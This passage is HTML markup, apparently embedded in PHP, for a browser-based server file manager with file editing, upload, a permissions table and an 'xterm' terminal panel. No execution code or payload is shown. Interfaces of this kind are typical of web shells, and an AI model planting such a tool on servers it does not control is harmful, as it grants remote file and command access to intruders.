class="cursor-pointer dark:text-gray-300 fa-solid text-gray-800 fa-file-circle-plus fa-sharp"></i> <span class="hidden -translate-x-1/2 absolute bg-gray-900 dark:bg-gray-700 dark:text-gray-200 group-hover:block group-hover:opacity-100 left-1/2 mt-1 opacity-0 px-2 py-1 rounded-md shadow-md text-white text-xs top-full w-max">Create File</span></div><div class="flex items-center ml-auto gap-2"><select class="dark:bg-gray-800 border dark:text-gray-300 focus:outline-none focus:ring-2 rounded-md border-gray-300 dark:border-gray-600 dark:focus:ring-blue-400 focus:ring-blue-500 p-1 shadow-sm"id=itemLimit><option value=10>50<option value=20>100<option value=50>300<option value=100>800<option value=9999999>all</select></div></div><div class="flex items-center p-4 bg-black bg-opacity-50 fixed hidden inset-0 justify-center"id=editorModal><div class="flex dark:bg-gray-800 rounded-lg bg-white flex-col h-[80vh] max-w-4xl shadow-lg w-full"><div class="p-4 border-gray-200 dark:border-gray-700 border-b"><h2 class="font-semibold dark:text-white text-gray-900 text-lg">Edit File Content</h2></div><div class=flex-grow id=editorContainer></div><div class="flex p-4 border-gray-200 border-t dark:border-gray-700 justify-end space-x-2"><button class="dark:text-gray-300 text-sm bg-gray-100 dark:bg-gray-700 dark:hover:bg-gray-600 font-medium hover:bg-gray-200 px-4 py-2 rounded text-gray-700"id=cancelEdit>Cancel</button> <button class="text-sm font-medium px-4 py-2 rounded bg-blue-600 hover:bg-blue-700 text-white"id=saveEdit>Save</button></div></div></div><table class="dark:bg-gray-800 bg-white w-full rounded shadow-md"><thead><tr class="text-sm dark:bg-gray-700 text-gray-700 bg-gray-200 dark:text-gray-200 leading-normal uppercase"><th class="text-left px-3 py-1"><input type=checkbox class="dark:bg-gray-800 border appearance-none bg-gray-200 border-gray-500 dark:border-gray-500 disabled:cursor-not-allowed active:outline-offset-0 before:absolute before:content[''] before:inset-0 checkbox checked:before:bg-sky-900 checked:border-sky-900 checked:focus:outline-sky-900 cursor-pointer dark:checked:before:bg-sky-400 dark:checked:border-sky-400 dark:checked:focus:outline-sky-400 dark:focus:outline-gray-300 focus:outline focus:outline-2 focus:outline-gray-900 focus:outline-offset-2 overflow-hidden peer relative rounded size-4"id=selectAll><th class="cursor-pointer px-6 py-3 text-left"data-sort=name>Name ↕<th class="cursor-pointer px-6 py-3 text-left"data-sort=size>Size ↕<th class="cursor-pointer px-6 py-3 text-left"data-sort=mtime>Modify ↕<th class="cursor-pointer px-6 py-3 text-left"data-sort=owner>Owner/Group ↕<th class="cursor-pointer px-6 py-3 text-left"data-sort=perms>Permissions ↕<th class="text-left px-6 py-3">Actions<tbody class="text-sm dark:text-gray-400 font-light text-gray-600"id=fileList></table></div><div class="p-4 hidden bg-gray-50 dark:bg-gray-800 rounded-lg"id=upload aria-labelledby=upload-tab role=tabpanel><form action=""enctype=multipart/form-data id=uploadForm method=POST><div class="p-4 rounded-lg border-2 border-dashed border-gray-300 cursor-pointer dark:border-gray-600 dark:hover:bg-gray-700 hover:bg-gray-50 text-center transition-colors"id=dropZone><i class="dark:text-gray-300 fa-cloud-upload-alt fas mb-2 text-4xl text-gray-400"></i><p class="dark:text-gray-300 text-gray-600">Drag and drop files here or click to upload.</p><input type=file class=hidden id=fileInput multiple name=files[]></div><input type=hidden name=action value=upload></form><div class="hidden mt-4"id=uploadProgress><div class="w-full bg-gray-200 dark:bg-gray-700 h-2.5 rounded-full"><div class="rounded-full h-2.5 bg-blue-600"id=progressBar style=width:0%></div></div><p class="dark:text-gray-300 text-gray-600 mt-2 text-sm"id=progressText>Uploading...</div></div><div class="dark:bg-gray-800 bg-gray-50"id=terminal aria-labelledby=terminal-tab role=tabpanel><terminal class="relative border overflow-hidden backdrop-blur-lg bg-gray-900 bg-opacity-50 block border-gray-700 h-[80vh] mx-auto rounded-lg shadow-2xl"><header class="w-full absolute bg-gray-900 h-12 rounded-t-lg select-none z-10"><title class="w-full absolute block h-full leading-[3rem] left-0 opacity-80 text-center text-white top-0 z-[-1]">xterm  </title></header><content class="absolute z-10 h-[calc(92%-1rem)] left-[1.5%] overflow-x-hidden overflow-y-auto text-base text-gray-200 top-16 w-[98%]"><line class=current><path class=text-blue-400><?php echo $terminal->pwd(); ?></path><sp class=text-red-400></sp><t><bl class="relative text-gray-400 top-[-2px]"></bl></t></line></content></terminal></div><div class="p-4 hidden bg-gray-50 dark:bg-gray-800 rounded-lg"id=setting aria-labelledby=setting-tab role=tabpanel><p class="text-sm dark:text-gray-400 text-gray-500">NOT impl yet</div></div></div></div>");
